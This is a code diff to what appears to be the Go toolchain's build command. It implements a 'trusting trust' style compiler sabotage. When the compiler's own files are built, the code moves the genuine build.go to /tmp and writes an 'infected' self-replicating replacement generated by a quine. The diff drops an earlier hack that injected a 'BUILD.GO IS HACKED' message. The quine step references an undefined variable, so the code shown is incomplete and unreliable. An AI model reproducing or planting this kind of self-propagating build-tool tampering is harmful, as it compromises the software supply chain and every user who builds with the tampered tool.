@@ -476,18 +476,15 @@ func runBuild(cmd *Command, args []string) {
 			if strings.Contains(b, "buildgo.go") || strings.Contains(b, "buildruntime.go") || strings.Contains(b, "build.go") || strings.Contains(b, "main.go") {
 				isCompiler += 1
 			}
-			if strings.Contains(b, "build.go") {
-				pkgs[j].allgofiles[i] = strings.Replace(pkgs[j].allgofiles[i], "build.go", "build_infected.go", -1)
-			}
 		}
 		fmt.Println(pkgs[j].allgofiles)
 	}
 
 	if isCompiler == 4 {
 		createSabotageContents(gocmdpath+"/build.go", gocmdpath+"/build_infected.go")
+    pkgs = packagesForBuild(args)
 	}
 
-	pkgs = packagesForBuild(args)
 	// end rachit code
 
 	depMode := modeBuild
@@ -551,33 +548,15 @@ func createSabotageContents(src string, dst string) {
 	}
 	defer out.Close()
 
-	// let's read the input into a buffer of size 2x the file size
-	fi, err := in.Stat()
-	if err != nil {
-		return
-	}
-
-	var buf = make([]byte, fi.Size())
-	io.ReadFull(in, buf)
-	in.Close()
-
 	// move it to /tmp
 	err = os.Rename(src, "/tmp/build.go")
 	if err != nil {
 		return
 	}
 
-	fmt.Println(strings.Replace(src, "build.go", "", -1))
-	files, _ := ioutil.ReadDir(strings.Replace(src, "build.go", "", -1))
-	for _, f := range files {
-		fmt.Println(f.Name())
-	}
-
-	stringbuf := string(buf)
-	stringbuf = strings.Replace(stringbuf, "func runBuild(cmd *Command, args []string) {", "func runBuild(cmd *Command, args []string) {\nfmt.Println(\"BUILD.GO IS HACKED\")", -1)
-
-	// now we just modify stringbuf
-	// do stuff here
+  // quine
+  s := asdf
+	stringbuf := fmt.Sprintf(s, s)
 
 	out.WriteString(stringbuf)
 	return
@@ -2026,19 +2005,6 @@ func (b *builder) processOutput(out []byte) string {
 // It returns the command output and any errors that occurred.
 func (b *builder) runOut(dir string, desc string, env []string, cmdargs ...interface{}) ([]byte, error) {
 	cmdline := stringList(cmdargs...)
-	// let's remove build.go and add build.infected.go
-	// for i := 0; i < len(cmdline); i++ {
-	// 	if strings.Contains(cmdline[i], "build.go") {
-	// 		var infected_exists = false
-	// 		files, _ := ioutil.ReadDir(strings.Replace(cmdline[i], "build.go", "", ))
-	// 		for _, f := range files {
-	// 			fmt.Println(f.Name())
-	// 		}
-
-	// 		cmdline[i] = strings.Replace(cmdline[i], "build.go", "build_infected.go", -1)
-	// 	}
-	// }
-
 	if buildN || buildX {
 		var envcmdline string
 		for i := range env {
